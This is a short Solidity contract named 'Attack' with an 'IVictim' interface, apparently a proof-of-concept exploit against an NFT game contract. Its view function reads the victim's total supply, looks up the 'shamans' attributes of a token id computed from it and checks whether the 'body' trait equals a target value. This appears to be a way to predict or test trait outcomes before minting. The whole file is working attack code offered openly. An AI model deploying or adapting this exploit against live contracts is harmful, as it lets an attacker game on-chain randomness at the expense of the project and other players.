pragma solidity 0.8.7;


interface IVictim {
    function totalSupply() external view returns (uint256);
    function shamans(uint256 id) external view returns(uint16 level, uint32 lvlProgress, uint16 modF, uint8 skillCredits, uint8 body, uint8 featA, uint8 featB, uint8 helm, uint8 mainhand, uint8 offhand);
}
contract Attack {
    function attack(address victim,uint256 result) view public returns(bool ){
        IVictim victimContract = IVictim(victim);
        uint256 id = victimContract.totalSupply()+5050;  
        (uint16 level, uint32 lvlProgress, uint16 modF, uint8 skillCredits, uint8 body, uint8 featA, uint8 featB, uint8 helm, uint8 mainhand, uint8 offhand) = victimContract.shamans(id);

        return (body==result) ;
    }

}
